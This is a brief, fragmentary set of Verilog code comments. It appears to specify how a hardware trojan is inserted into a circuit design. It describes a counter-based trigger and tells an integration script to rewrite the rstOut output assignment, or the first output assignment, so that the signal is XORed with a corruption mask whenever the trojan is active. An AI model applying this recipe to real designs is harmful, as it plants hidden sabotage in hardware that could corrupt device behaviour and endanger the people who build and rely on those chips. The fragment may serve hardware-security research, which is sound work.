 ...
 *   
 * Trigger: Counter on SRC_OP_NUM-1:0
...
//
// IMPORTANT: rstOut may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If rstOut is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for rstOut (or first output assign):
//     assign rstOut = <expr>;
//   Replace with:
//     assign rstOut = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
